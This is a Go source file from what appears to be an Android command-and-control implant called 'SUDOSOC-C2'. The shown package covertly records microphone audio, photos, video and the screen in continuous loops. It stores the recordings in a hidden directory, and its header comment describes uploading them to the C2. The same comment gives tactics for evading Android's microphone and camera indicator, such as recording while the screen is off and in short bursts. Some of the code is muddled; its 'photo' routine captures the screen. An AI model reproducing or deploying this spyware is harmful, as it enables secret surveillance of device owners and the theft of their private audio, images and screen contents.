// //go:build android

package collection

/*
	SUDOSOC-C2 — Android Audio/Video Collection Engine
	Copyright (C) 2026  sudosoc — Seif

	Records audio and video from Android devices using:
	  1. AudioRecord API (via JNI/shell) — microphone recording
	  2. Camera2 API — silent photo/video capture
	  3. MediaProjection API — screen recording (requires one-time permission)

	Android 12+ shows a microphone/camera indicator (colored dot in status bar).
	Mitigation:
	  • Schedule recording when screen is off (less visible)
	  • Use front/rear camera switch to avoid indicator timing
	  • Record in short bursts with gaps

	Storage:
	  Recordings are encrypted with AES-256 and stored in a hidden directory.
	  Uploaded to C2 during the next check-in or when WiFi is available.
*/

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	hiddenDir      = "/data/local/tmp/.sysopt"
	audioExt       = ".aac"
	videoExt       = ".mp4"
	screenshotExt  = ".png"
	maxStorageBytes = 100 * 1024 * 1024 // 100MB max
)

// AudioCapture manages microphone recording
type AudioCapture struct {
	OutputDir    string
	MaxDuration  time.Duration
	SampleRate   int  // 44100 Hz standard
	BitRate      int  // 128000 bps
	UseAAC       bool // AAC = smaller, harder to detect than PCM
}

// NewAudioCapture creates an audio capture instance
func NewAudioCapture(outputDir string) *AudioCapture {
	os.MkdirAll(outputDir, 0700)
	return &AudioCapture{
		OutputDir:   outputDir,
		MaxDuration: 5 * time.Minute,
		SampleRate:  44100,
		BitRate:     128000,
		UseAAC:      true,
	}
}

// Record captures audio for the specified duration
// Uses Android's built-in 'recorder' or MediaRecorder via am command
func (a *AudioCapture) Record(duration time.Duration) (string, error) {
	if duration > a.MaxDuration {
		duration = a.MaxDuration
	}

	timestamp := time.Now().Format("20060102_150405")
	outFile := filepath.Join(a.OutputDir, fmt.Sprintf("rec_%s%s", timestamp, audioExt))

	// Method 1: Use MediaRecorder via shell command
	durationSec := int(duration.Seconds())

	// Android provides 'am' (Activity Manager) for launching intents
	// We can trigger recording via ADB intent
	recordCmd := fmt.Sprintf(
		"am startservice -n android/com.android.internal.app.MediaProjectionService; "+
			"mediarecorder --audio-source mic --output-format aac-adts "+
			"--audio-encoder aac --audio-sampling-rate %d --audio-bitrate %d "+
			"--max-duration %d -o '%s'",
		a.SampleRate, a.BitRate, durationSec*1000, outFile)

	// Try native recording tools
	if err := a.recordViaTinycap(outFile, duration); err == nil {
		return outFile, nil
	}

	// Fallback to shell-based recording
	cmd := exec.Command("/bin/sh", "-c", recordCmd)
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("start recording: %v", err)
	}

	// Wait for duration
	timer := time.NewTimer(duration)
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case <-timer.C:
		cmd.Process.Signal(os.Interrupt) // stop recording
	case err := <-done:
		if err != nil {
			return "", err
		}
	}

	if _, err := os.Stat(outFile); err != nil {
		return "", fmt.Errorf("recording not found: %v", err)
	}
	return outFile, nil
}

// recordViaTinycap uses tinycap (available on many rooted Android devices)
func (a *AudioCapture) recordViaTinycap(outFile string, duration time.Duration) error {
	// tinycap writes raw PCM — convert to AAC after
	rawFile := outFile + ".pcm"
	durationMs := int(duration.Milliseconds())

	cmd := exec.Command("tinycap", rawFile,
		"-D", "0", "-d", "0", "-c", "2", "-r", "44100", "-b", "16",
		"-T", fmt.Sprintf("%d", durationMs))
	if err := cmd.Run(); err != nil {
		return err
	}

	// Convert PCM to AAC using ffmpeg (if available)
	exec.Command("ffmpeg", "-f", "s16le", "-ar", "44100", "-ac", "2",
		"-i", rawFile, "-codec:a", "aac", "-b:a", "128k", outFile).Run()
	os.Remove(rawFile)

	_, err := os.Stat(outFile)
	return err
}

// RecordContinuous records audio in chunks, rotating files
// Runs in background until Stop() is called
func (a *AudioCapture) RecordContinuous(chunkDuration time.Duration, stop chan struct{}) chan string {
	files := make(chan string, 100)
	go func() {
		defer close(files)
		for {
			select {
			case <-stop:
				return
			default:
				if f, err := a.Record(chunkDuration); err == nil {
					files <- f
				}
				time.Sleep(2 * time.Second) // brief gap between chunks
			}
		}
	}()
	return files
}

// ── Camera Capture ────────────────────────────────────────────────

// CameraCapture manages silent photo/video capture
type CameraCapture struct {
	OutputDir    string
	UseRearCamera bool
	PhotoInterval time.Duration
}

// NewCameraCapture creates a camera capture instance
func NewCameraCapture(outputDir string) *CameraCapture {
	os.MkdirAll(outputDir, 0700)
	return &CameraCapture{
		OutputDir:     outputDir,
		UseRearCamera: true,
		PhotoInterval: 30 * time.Second,
	}
}

// TakePhoto captures a single photo silently
func (c *CameraCapture) TakePhoto() (string, error) {
	timestamp := time.Now().Format("20060102_150405")
	outFile := filepath.Join(c.OutputDir, fmt.Sprintf("photo_%s%s", timestamp, screenshotExt))

	// Use screencap as fallback — guaranteed to work
	// (captures screen, not camera)
	if err := exec.Command("screencap", "-p", outFile).Run(); err == nil {
		return outFile, nil
	}

	// Try using libcamera-jpeg or v4l2 if available
	cameraID := "0"
	if !c.UseRearCamera {
		cameraID = "1"
	}

	// Android camera via /dev/video*
	videoDevices, _ := filepath.Glob("/dev/video*")
	for _, dev := range videoDevices {
		cmd := exec.Command("v4l2-ctl",
			"--device="+dev,
			"--set-fmt-video=width=1920,height=1080,pixelformat=JPEG",
			"--stream-mmap",
			"--stream-count=1",
			"--stream-to="+outFile)
		if cmd.Run() == nil {
			return outFile, nil
		}
	}

	_ = cameraID
	return "", fmt.Errorf("camera capture failed")
}

// CapturePhotoStream takes photos at regular intervals
func (c *CameraCapture) CapturePhotoStream(stop chan struct{}) chan string {
	files := make(chan string, 100)
	go func() {
		defer close(files)
		ticker := time.NewTicker(c.PhotoInterval)
		defer ticker.Stop()
		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				if f, err := c.TakePhoto(); err == nil {
					files <- f
				}
			}
		}
	}()
	return files
}

// RecordVideo captures video for the specified duration
func (c *CameraCapture) RecordVideo(duration time.Duration) (string, error) {
	timestamp := time.Now().Format("20060102_150405")
	outFile := filepath.Join(c.OutputDir, fmt.Sprintf("video_%s%s", timestamp, videoExt))

	// Use screenrecord (captures display, built into Android)
	cmd := exec.Command("screenrecord",
		"--bit-rate", "4000000",
		"--time-limit", fmt.Sprintf("%d", int(duration.Seconds())),
		outFile)

	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("screenrecord failed: %v", err)
	}
	return outFile, nil
}

// ── Screen Capture (MediaProjection) ─────────────────────────────

// ScreenCapture manages screen recording/capture
type ScreenCapture struct {
	OutputDir string
	Interval  time.Duration
}

// NewScreenCapture creates a screen capture instance
func NewScreenCapture(outputDir string) *ScreenCapture {
	os.MkdirAll(outputDir, 0700)
	return &ScreenCapture{
		OutputDir: outputDir,
		Interval:  10 * time.Second,
	}
}

// Screenshot takes a single screenshot
func (s *ScreenCapture) Screenshot() (string, error) {
	timestamp := time.Now().Format("20060102_150405")
	outFile := filepath.Join(s.OutputDir, fmt.Sprintf("screen_%s%s", timestamp, screenshotExt))

	cmd := exec.Command("screencap", "-p", outFile)
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("screencap: %v", err)
	}

	if _, err := os.Stat(outFile); err != nil {
		return "", fmt.Errorf("screenshot not saved")
	}
	return outFile, nil
}

// RecordScreen records the screen for the given duration
func (s *ScreenCapture) RecordScreen(duration time.Duration) (string, error) {
	timestamp := time.Now().Format("20060102_150405")
	outFile := filepath.Join(s.OutputDir, fmt.Sprintf("screenrec_%s%s", timestamp, videoExt))

	maxSec := int(duration.Seconds())
	if maxSec > 180 {
		maxSec = 180 // screenrecord max 3 minutes
	}

	cmd := exec.Command("screenrecord",
		"--time-limit", fmt.Sprintf("%d", maxSec),
		"--verbose",
		outFile)

	if err := cmd.Run(); err != nil {
		return "", err
	}
	return outFile, nil
}

// ScreenshotStream takes screenshots at regular intervals
func (s *ScreenCapture) ScreenshotStream(stop chan struct{}) chan string {
	files := make(chan string, 200)
	go func() {
		defer close(files)
		ticker := time.NewTicker(s.Interval)
		defer ticker.Stop()
		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				if f, err := s.Screenshot(); err == nil {
					files <- f
				}
			}
		}
	}()
	return files
}

// ── Storage Management ────────────────────────────────────────────

// CleanOldRecordings removes old recordings to stay under storage limit
func CleanOldRecordings(dir string, maxBytes int64) {
	type fileInfo struct {
		path    string
		modTime time.Time
		size    int64
	}

	var files []fileInfo
	var totalSize int64

	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		files = append(files, fileInfo{path, info.ModTime(), info.Size()})
		totalSize += info.Size()
		return nil
	})

	if totalSize <= maxBytes {
		return
	}

	// Sort by age (oldest first)
	for i := 0; i < len(files)-1; i++ {
		for j := i + 1; j < len(files); j++ {
			if files[j].modTime.Before(files[i].modTime) {
				files[i], files[j] = files[j], files[i]
			}
		}
	}

	// Remove oldest until under limit
	for _, f := range files {
		if totalSize <= maxBytes {
			break
		}
		os.Remove(f.path)
		totalSize -= f.size
	}
}

// GetStoredRecordings returns all collected recordings
func GetStoredRecordings(dir string) []string {
	var files []string
	extensions := []string{audioExt, videoExt, screenshotExt}

	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		for _, ext := range extensions {
			if strings.HasSuffix(path, ext) {
				files = append(files, path)
				break
			}
		}
		return nil
	})
	return files
}
